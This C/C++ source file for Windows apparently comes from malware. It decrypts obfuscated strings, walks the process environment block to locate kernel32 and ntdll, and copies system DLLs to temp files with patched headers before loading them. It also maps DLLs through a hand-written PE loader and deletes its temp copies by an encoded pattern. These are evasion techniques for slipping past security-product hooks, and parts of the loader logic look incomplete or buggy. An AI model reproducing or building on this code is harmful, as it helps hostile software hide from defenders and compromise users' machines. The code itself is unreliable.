#include <windows.h>
#include <string.h>

struct MZHeader {
    unsigned char data[0x40];
};

struct PE_Header {
    unsigned int signature;
    unsigned short machine;
    unsigned short numSections;
    unsigned int timeDateStamp;
    unsigned int pointerToSymbolTable;
    unsigned int numOfSymbols;
    unsigned short sizeOfOptionHeader;
    unsigned short characteristics;
};

struct PE_ExtHeader {
    unsigned short magic;
    unsigned char majorLinkerVersion;
    unsigned char minorLinkerVersion;
    unsigned int sizeOfCode;
    unsigned int sizeOfInitializedData;
    unsigned int sizeOfUninitializedData;
    unsigned int addressOfEntryPoint;
    unsigned int baseOfCode;
    unsigned int baseOfData;
    unsigned int imageBase;
    unsigned int sectionAlignment;
    unsigned int fileAlignment;
    unsigned short majorOSVersion;
    unsigned short minorOSVersion;
    unsigned short majorImageVersion;
    unsigned short minorImageVersion;
    unsigned short majorSubsystemVersion;
    unsigned short minorSubsystemVersion;
    unsigned int reserved1;
    unsigned int sizeOfImage;
    unsigned int sizeOfHeaders;
    unsigned int checksum;
    unsigned short subsystem;
    unsigned short DLLCharacteristics;
    unsigned int sizeOfStackReserve;
    unsigned int sizeOfStackCommit;
    unsigned int sizeOfHeapReserve;
    unsigned int sizeOfHeapCommit;
    unsigned int loaderFlags;
    unsigned int numberOfRVAAndSizes;
    unsigned int dataDirectories[16][2];
};

struct SectionHeader {
    unsigned char name[8];
    unsigned int virtualSize;
    unsigned int virtualAddress;
    unsigned int rawDataSize;
    unsigned int rawDataOffset;
    unsigned char rest[16];
};

static char* CONTAINER_NAME = "\x01\x19\xb0\x46\x7a\x25\xea\x6e\x48\x88\x63\x4d\xa3\x84\x85\x94\x41\x32\x3e";

char* _Dect1(char* text);

class CSafeAPI {
public:
    CSafeAPI();
    ~CSafeAPI();

    int Init(const char* path);
    int LoadDLL(const char* path);
    void Close();
    HINSTANCE GetModule();

private:
    HINSTANCE m_module;
    char m_fileName[0x104];
};

void* loadDLL(char* path);
unsigned int getAlignedSize(unsigned int size, unsigned int align);
bool readPEInfo(char* image, MZHeader* mz, PE_Header* pe,
                PE_ExtHeader* ext, SectionHeader** sections);
int calcTotalImageSize(MZHeader* mz, PE_Header* pe, PE_ExtHeader* ext,
                       SectionHeader* sections);
bool loadPE(char* image, MZHeader* mz, PE_Header* pe, PE_ExtHeader* ext,
            SectionHeader* sections, void* mapped);

CSafeAPI::CSafeAPI()
    : m_module(0) {
    m_fileName[0] = 0;
}

CSafeAPI::~CSafeAPI() {
}

int CSafeAPI::Init(const char* path) {
    if (m_module) {
        Close();
    }

    char systemPath[0x104];
    unsigned char header[0x40];
    unsigned char ntHeader[0xf8];
    DWORD bytes;

    GetSystemDirectoryA(systemPath, sizeof(systemPath));
    strcat(systemPath, "\\");
    strcat(systemPath, path);

    GetTempPathA(sizeof(m_fileName), m_fileName);
    GetTempFileNameA(m_fileName, "np", 0, m_fileName);
    CopyFileA(systemPath, m_fileName, FALSE);

    HANDLE file = CreateFileA(m_fileName, GENERIC_READ | GENERIC_WRITE, 3, 0,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (file != INVALID_HANDLE_VALUE) {
        ReadFile(file, header, sizeof(header), &bytes, 0);
        if (*(unsigned short*)header == 0x5a4d) {
            SetFilePointer(file, *(DWORD*)(header + 0x3c), 0, FILE_BEGIN);
            ReadFile(file, ntHeader, sizeof(ntHeader), &bytes, 0);
            if (*(DWORD*)ntHeader == 0x4550 &&
                *(DWORD*)(ntHeader + 0x34) > 0x80000000) {
                *(DWORD*)(ntHeader + 0x34) = 0x10000000;
                SetFilePointer(file, *(DWORD*)(header + 0x3c), 0, FILE_BEGIN);
                WriteFile(file, ntHeader, sizeof(ntHeader), &bytes, 0);
            }
        }
        CloseHandle(file);
    }

    m_module = LoadLibraryExA(m_fileName, 0, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (m_module) {
        return 1;
    }

    m_fileName[0] = 0;
    m_module = LoadLibraryExA(path, 0, LOAD_WITH_ALTERED_SEARCH_PATH);
    return m_module != 0;
}

void CSafeAPI::Close() {
    if (m_module) {
        if (m_fileName[0]) {
            FreeLibrary(m_module);
            DeleteFileA(m_fileName);
        } else {
            HeapFree(GetProcessHeap(), 0, m_module);
        }
        m_module = 0;
    }
}

HINSTANCE CSafeAPI::GetModule() {
    return m_module;
}

int CSafeAPI::LoadDLL(const char* path) {
    m_module = (HINSTANCE)loadDLL((char*)path);
    return m_module != 0;
}

void DeleteTempSafeDll() {
    char tempPath[0x104];
    char pattern[0x104];
    WIN32_FIND_DATAA findData;

    GetTempPathA(sizeof(tempPath), tempPath);
    strcpy(pattern, tempPath);
    strcat(pattern, _Dect1("\x01\xa5\x54\x32\xb6\xb1\x56\x83\x34\x94\x54"));

    HANDLE find = FindFirstFileA(pattern, &findData);
    if (find != INVALID_HANDLE_VALUE) {
        do {
            strcpy(pattern, tempPath);
            strcat(pattern, findData.cFileName);
            DeleteFileA(pattern);
        } while (FindNextFileA(find, &findData));
        FindClose(find);
    }
}

unsigned int myStrlenA(char* text) {
    unsigned int length = 0;
    while (*text) {
        ++length;
        ++text;
    }
    return length;
}

int myStrcmpA(char* left, char* right) {
    while (*left && *right) {
        if (*left != *right) {
            return 0;
        }
        ++left;
        ++right;
    }

    char r = *right;
    if (*left) {
        if (!r) {
            return 0;
        }
    } else if (!r) {
        return 1;
    }

    if (*right && !*left) {
        return 0;
    }
    return 1;
}

bool readPEInfo(char* image, MZHeader* mz, PE_Header* pe,
                PE_ExtHeader* ext, SectionHeader** sections) {
    if (*(unsigned short*)image != 0x5a4d) {
        return false;
    }

    char* nt = image + *(unsigned int*)(image + 0x3c);
    if (*(unsigned short*)(nt + 0x14) != 0xe0) {
        return false;
    }

    char* extStart = nt + 0x18;
    memcpy(mz, image, 0x40);
    memcpy(pe, nt, 0x18);
    memcpy(ext, extStart, 0xe0);
    *sections = (SectionHeader*)(extStart + 0xe0);
    return true;
}

void getKern32AndNtdllAddr(unsigned int* kernel32, unsigned int* ntdll) {
    unsigned int* entry;

    __asm {
        mov eax, fs:[0x30]
        mov eax, [eax + 0x0c]
        mov esi, [eax + 0x1c]
        mov entry, esi
    }

    *ntdll = entry[2];
    entry = (unsigned int*)entry[0];
    *kernel32 = entry[2];
}

int calcTotalImageSize(MZHeader* inMZ, PE_Header* inPE, PE_ExtHeader* inpeXH,
                       SectionHeader* inSecHdr) {
    int result = 0;
    int alignment = inpeXH->sectionAlignment;

    if (inpeXH->sizeOfHeaders % alignment == 0) {
        result += inpeXH->sizeOfHeaders;
    } else {
        int val = inpeXH->sizeOfHeaders / alignment;
        val++;
        result += val * alignment;
    }

    for (int i = 0; i < inPE->numSections; i++) {
        if (inSecHdr[i].virtualSize) {
            if (inSecHdr[i].virtualSize % alignment == 0) {
                result += inSecHdr[i].virtualSize;
            } else {
                int val = inSecHdr[i].virtualSize / alignment;
                val++;
                result += val * alignment;
            }
        }
    }

    return result;
}

unsigned int getAlignedSize(unsigned int size, unsigned int align) {
    if (size % align) {
        return (size / align + 1) * align;
    }
    return size;
}

bool loadPE(char* image, MZHeader* mz, PE_Header* pe, PE_ExtHeader* ext,
            SectionHeader* sections, void* mapped) {
    memcpy(mapped, image, *(unsigned int*)((unsigned char*)ext + 0x3c));

    char* cursor = (char*)mapped +
        getAlignedSize(*(unsigned int*)((unsigned char*)ext + 0x3c),
                       *(unsigned int*)((unsigned char*)ext + 0x20));
    SectionHeader* section = sections;
    for (int i = 0; i < *(unsigned short*)((unsigned char*)pe + 0x06);
         ++i, ++section) {
        unsigned int copySize = section->rawDataSize;
        if (copySize > 0) {
            if (copySize > section->virtualSize) {
                copySize = section->virtualSize;
            }
            memcpy(cursor, image + section->rawDataOffset, copySize);
            cursor += getAlignedSize(section->virtualSize,
                                     *(unsigned int*)((unsigned char*)ext + 0x20));
        }
    }

    return true;
}

int isStrDifferenti(char* left, char* right) {
    while (*left && *right) {
        if (*left == *right) {
            ++left;
            ++right;
            continue;
        }
        if (*left >= 'a' && *left <= 'z') {
            if (*left - 0x20 != *right) {
                return 1;
            }
        } else {
            if (*right < 'a' || *right > 'z' ||
                *right - 0x20 != *left) {
                return 1;
            }
        }
        ++left;
        ++right;
    }

    if (*left && !*right) {
        return 1;
    }
    if (*right && !*left) {
        return 1;
    }
    return 0;
}

void* loadDLL(char* path) {
    SectionHeader* sections;
    void* mapped;
    DWORD fileSize;
    DWORD bytesRead;
    PE_Header pe;
    MZHeader mz;
    BY_HANDLE_FILE_INFORMATION info;
    char fullPath[MAX_PATH + 1];
    PE_ExtHeader ext;

    mapped = 0;
    GetSystemDirectoryA(fullPath, MAX_PATH);
    if (myStrlenA(path) + myStrlenA(fullPath) >= MAX_PATH) {
        return 0;
    }

    strcat(fullPath, "\\");
    strcat(fullPath, path);

    HANDLE file = CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ, 0,
                              OPEN_EXISTING, 0, 0);
    if (file != INVALID_HANDLE_VALUE) {
        GetFileInformationByHandle(file, &info);
        fileSize = info.nFileSizeLow;
        if (fileSize) {
            char* image = (char*)HeapAlloc(GetProcessHeap(), 0, fileSize);
            if (image) {
                if (ReadFile(file, image, fileSize, &bytesRead, 0)) {
                    if (bytesRead == fileSize) {
                        if (readPEInfo(image, &mz, &pe, &ext, &sections)) {
                            int imageSize = calcTotalImageSize(&mz, &pe, &ext, sections);
                            mapped = HeapAlloc(GetProcessHeap(), 0, imageSize);
                            if (mapped) {
                                loadPE(image, &mz, &pe, &ext, sections, mapped);
                            }
                        }
                    }
                }
                HeapFree(GetProcessHeap(), 0, image);
            }
        }
        CloseHandle(file);
    }

    return mapped;
}
